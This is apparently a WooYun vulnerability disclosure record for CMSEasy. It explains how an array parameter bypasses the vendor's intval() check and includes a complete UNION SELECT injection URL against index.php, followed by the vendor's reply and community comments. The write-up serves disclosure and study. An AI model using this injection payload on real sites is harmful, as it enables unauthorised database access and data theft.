{"id": 44314, "wybug_id": "wooyun-2015-094151", "wybug_title": "cmseasy 修复不当前台无需登录union注射（php缺陷绕过）", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2015-01-27 22:29", "wybug_open_date": "2015-04-27 22:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向公众公开  简要描述： cmseasy 修复不当前台无需登录union注射 详细说明：  下载最新版本的cmseasy，文件大小：9.83 MB更新日期：2015-01-21推荐配置：Mysql5.0 + PHP 5.0看看这里的修复方案：archive.php:\n} elseif (intval(front::get('aid'))) {            $this->view->archive = archive::getInstance()->getrow(front::get('aid'));            $this->view->categorys = category::getpositionlink2($this->view->archive['catid']);            $this->view->paylist = pay::getInstance()->getrows('', 50);            $this->view->logisticslist = logistics::getInstance()->getrows('', 50);\n这里居然搞成intval(front::get('aid'))  这不是自欺欺人呢么大家都知道intval(\"1 sdasda\") == 1 成立的还有一个特性，就是如果传递的是数组<?php $a = array(1234);echo intval($a);?>这个的输出结果是1 正好绕过ok访问url:http://localhost/cmseasynew/uploads/index.php?case=archive&act=orders&aid[typeid%60%3d1%20UNION%20SELECT/**/1,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-01-28 14:28 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-27 22:38 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  php缺陷绕过？啥缺陷呢？M老师求指引    \n     2015-01-27 22:40 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @menmen519 大神最近闭关了啊  好久没看到了    \n     2015-01-27 23:11 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @子非海绵宝宝 最近比较忙，偶尔上乌云    \n     2015-01-27 23:12 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @泳少 intval的问题    \n     2015-01-27 23:34 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  膜拜    \n     2015-01-27 23:42 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:815 漏洞数:99        | 打酱油的~)\t\t \n  牛逼，intval都能绕过    \n     2015-01-28 00:58 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @menmen519 intval。1xxx=1之类的么    \n     2015-01-28 08:18 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @roker 不完全是    \n     2015-01-28 15:39 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  1rank? .....    \n     2015-01-28 15:43 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  怎么才1rank。难道有限制？    \n     2015-01-28 15:51 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @roker 无限制 不知道啊    \n     2015-02-02 18:43 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  1rank？......    \n     2015-02-02 18:49 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @君宝 恩    \n     2015-02-03 15:10 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  @menmen519 师父 下次扒了丫裤衩    \n     2015-02-17 16:08 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @roker roker屌爆，那么早就评论了：@menmen519 intval。1xxx=1之类的么    \n     2015-02-17 17:06 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @黑暗游侠 哈哈，过年快乐哈    \n     2015-02-18 12:35 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @menmen519 过年快乐~~~红包拿来啦！~~    \n     2015-04-27 23:46 |    \t\tizy \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:22        | http://1zy.pw/)\t\t \n  codz的intval又一个经典案例...    \n     2015-04-28 08:56 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  修补无效啊    \n     2015-04-28 09:46 |    \t\t蛋清 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        )\t\t \n  1rank？恶心人呢    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}